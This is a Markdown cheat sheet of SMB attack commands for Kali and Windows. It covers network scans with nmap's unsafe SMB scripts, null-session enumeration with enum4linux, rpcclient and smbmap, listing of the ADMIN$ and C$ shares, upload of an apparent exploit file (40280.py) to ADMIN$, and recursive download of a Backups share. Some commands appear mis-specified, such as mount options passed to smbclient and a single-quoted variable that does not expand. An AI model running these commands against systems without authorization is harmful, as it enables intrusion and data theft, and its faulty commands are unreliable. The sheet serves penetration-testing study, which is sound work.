# basic commands
## on Kali
- Search hosts running
~~~sh
TRGTRANGE="192.168.0.0/24"
nmap -v -p139,445 --open -oA nmap-smb ${TRGTRANGE}
nbtscan ${TRGTRANGE}

nmap --script smb-* --script-args=unsafe=1 ${TRGTRANGE}
~~~

- Specified target
~~~sh
TARGET="192.168.0.1"
GROUP="workgroup"

nmap -v -p139,445 --script smb-os-discovery.nse ${TARGET}
nmap --script smb-* --script-args=unsafe=1 ${TARGET}
  # ls -lh /usr/share/nmap/scripts/smb*

enum4linux -UMnSPGlD ${TARGET}
nmblookup -A ${TARGET}
smbclient //mnt/share -I ${TARGET} -N
rpcclient -U '' ${TARGET}
smbmap -u "" -p "" -d ${GROUP} -H ${TARGET}
~~~

- null session
~~~sh
enum4linux -a ${TARGET}
~~~

- upload file
~~~
smbclient //${TARGET}/ADMIN$ -U "nobody"%"somepassword" -c "put 40280.py"
~~~

- mount SMB(Windows)
~~~sh
USER="root"
PASS="root"
GROUP="BOB"
smbclient -L \\WIN7\ -I ${TARGET}
smbclient -L \\WIN7\ADMIN$  -I ${TARGET}
smbclient -L \\WIN7\C$ -I ${TARGET}
smbclient -L \\WIN7\IPC$ -I ${TARGET}
smbclient '\\${TARGET}\<sharename>' -o user=${USER},pass=${PASS},workgroup=${GROUP}
~~~

- Download folder
~~~
smbclient \\\\${TARGET}\\Backups -D {cd dir} -c "prompt;recurse;mget ${TARGET_DIR}"
~~~

## on Windows
- mount
~~~sh
net use X: \\${TARGET}\<sharename> /USER:${GROUP}\${USER} ${PASS} /PERSISTENT:YES
~~~

